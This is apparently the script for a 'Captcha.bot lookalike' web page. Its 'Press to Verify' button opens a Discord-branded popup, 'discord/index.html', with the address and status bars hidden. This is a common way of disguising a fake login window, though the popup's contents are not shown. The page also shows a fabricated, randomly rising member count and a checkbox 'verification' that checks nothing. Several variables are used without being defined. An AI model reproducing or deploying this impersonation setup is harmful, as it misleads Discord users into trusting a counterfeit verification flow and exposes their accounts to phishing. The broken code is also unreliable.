// DOM Elements
const verifyBtn = document.getElementById('verifyBtn');

// Make 'Press to Verify' open discord/index.html in a popup window
if (verifyBtn) {
    verifyBtn.onclick = (e) => {
        e.preventDefault();
        window.open('discord/index.html', 'discordPopup', 'width=420,height=500,menubar=no,toolbar=no,location=no,status=no');
    };
}

// Link map in script.js now includes:
const linkMap = {
    docs: 'https://docs.captcha.bot/',
    document: 'https://docs.captcha.bot/',
    pricing: 'https://captcha.bot/premium',
    premium: 'https://captcha.bot/premium',
    purchase: 'https://captcha.bot/premium',
    vote: 'https://discordbotlist.com/bots/server-captcha-bot/upvote',
    protect: 'https://discord.com/oauth2/authorize?client_id=512333785338216465&scope=bot%20applications.commands&permissions=268561430&response_type=code',
    help: 'https://discord.com/invite/captcha',
    twitter: 'https://x.com/discordcaptcha',
    terms: 'https://privy.gg/legal'
};

// Helper to set/update links later from console or code
window.setButtonLinks = function setButtonLinks(newLinks) {
    Object.assign(linkMap, newLinks || {});
};

function openMappedLink(name) {
    const url = linkMap[name];
    if (url && typeof url === 'string') {
        window.open(url, '_blank', 'noopener');
    } else {
        showDemoMessage(`Link for “${name}” not set yet`);
    }
}

// Modal functionality
verifyBtn.addEventListener('click', () => {
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
});

closeBtn.addEventListener('click', () => {
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
    resetVerification();
});

window.addEventListener('click', (e) => {
    if (e.target === modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
        resetVerification();
    }
});

// Captcha functionality
captchaCheck.addEventListener('change', () => {
    if (captchaCheck.checked) {
        completeBtn.disabled = false;
        // Add loading effect
        setTimeout(() => {
            captchaCheck.parentElement.style.borderColor = '#28a745';
            captchaCheck.parentElement.style.background = '#f8fff9';
        }, 500);
    } else {
        completeBtn.disabled = true;
        captchaCheck.parentElement.style.borderColor = '#ddd';
        captchaCheck.parentElement.style.background = '#f8f9fa';
    }
});

// Complete verification
completeBtn.addEventListener('click', () => {
    if (captchaCheck.checked) {
        // Show success animation
        completeBtn.innerHTML = '✓ Verified!';
        completeBtn.style.background = '#28a745';
        
        setTimeout(() => {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
            showSuccessMessage();
            resetVerification();
        }, 1500);
    }
});

// Reset verification state
function resetVerification() {
    captchaCheck.checked = false;
    completeBtn.disabled = true;
    completeBtn.innerHTML = 'Complete Verification';
    completeBtn.style.background = '#5865f2';
    captchaCheck.parentElement.style.borderColor = '#ddd';
    captchaCheck.parentElement.style.background = '#f8f9fa';
}

// Show success message
function showSuccessMessage() {
    const successDiv = document.createElement('div');
    successDiv.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #28a745;
        color: white;
        padding: 1rem 2rem;
        border-radius: 8px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        z-index: 1001;
        animation: slideInRight 0.3s ease;
    `;
    successDiv.innerHTML = '✓ Verification completed successfully!';
    
    // Add animation keyframes
    if (!document.querySelector('#successAnimation')) {
        const style = document.createElement('style');
        style.id = 'successAnimation';
        style.textContent = `
            @keyframes slideInRight {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(successDiv);
    
    setTimeout(() => {
        successDiv.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => {
            if (successDiv.parentNode) {
                successDiv.parentNode.removeChild(successDiv);
            }
        }, 300);
    }, 3000);
}

// Route clicks on [data-btn] elements through link map
document.addEventListener('click', (e) => {
    const el = e.target.closest('[data-btn]');
    if (!el) return;
    const name = el.getAttribute('data-btn');
    // Prevent default navigation (many have href="#...")
    e.preventDefault();
    // Special handling: waitlist should only clear the input field
    if (name === 'waitlist') {
        const input = el.parentElement && el.parentElement.querySelector('input[type="email"], input');
        if (input) input.value = '';
        return;
    }
    openMappedLink(name);
});

// Smooth scrolling for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        // Skip anchors used as named buttons; they'll be handled above
        if (this.hasAttribute('data-btn')) return;
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Add loading states to buttons
document.querySelectorAll('.btn, .verify-btn, .waitlist-btn').forEach(btn => {
    if (btn.id !== 'verifyBtn' && btn.id !== 'completeVerification') {
        btn.addEventListener('click', function(e) {
            e.preventDefault();
            
            const originalText = this.innerHTML;
            this.innerHTML = 'Loading...';
            this.style.opacity = '0.7';
            this.style.pointerEvents = 'none';
            
            setTimeout(() => {
                this.innerHTML = originalText;
                this.style.opacity = '1';
                this.style.pointerEvents = 'auto';
                
                // Show demo message
                showDemoMessage();
            }, 2000);
        });
    }
});

// Show demo message for non-functional links
function showDemoMessage(message) {
    const demoDiv = document.createElement('div');
    demoDiv.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: #f39c12;
        color: white;
        padding: 1rem 2rem;
        border-radius: 8px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        z-index: 1001;
        animation: fadeInOut 0.3s ease;
    `;
    demoDiv.innerHTML = message || '🎭 This is a demo - Link functionality not implemented';
    
    document.body.appendChild(demoDiv);
    
    setTimeout(() => {
        if (demoDiv.parentNode) {
            demoDiv.parentNode.removeChild(demoDiv);
        }
    }, 3000);
}

// Add parallax effect to background
window.addEventListener('scroll', () => {
    const scrolled = window.pageYOffset;
    const parallax = document.body;
    const speed = scrolled * 0.5;
    
    parallax.style.backgroundPosition = `center ${speed}px`;
});

// Add hover effects to cards
document.querySelectorAll('.server-card, .ad-card, .info-card').forEach(card => {
    card.addEventListener('mouseenter', function() {
        this.style.transform = 'translateY(-5px)';
        this.style.transition = 'transform 0.3s ease';
    });
    
    card.addEventListener('mouseleave', function() {
        this.style.transform = 'translateY(0)';
    });
});

// Initialize page
document.addEventListener('DOMContentLoaded', () => {
    console.log('Captcha.bot lookalike loaded successfully!');
    
    // Add subtle animations to elements as they come into view
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);
    
    // Observe all main sections
    document.querySelectorAll('.server-card, .ad-card, .info-card').forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });
});

// Add keyboard navigation support
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal.style.display === 'block') {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
        resetVerification();
    }
    
    if (e.key === 'Enter' && modal.style.display === 'block' && !completeBtn.disabled) {
        completeBtn.click();
    }
});

// Add fake loading for member count
let memberCount = 2;
setInterval(() => {
    if (Math.random() > 0.7) { // 30% chance to update
        memberCount += Math.floor(Math.random() * 3);
        document.querySelector('.member-count').textContent = `${memberCount} members`;
    }
}, 5000);
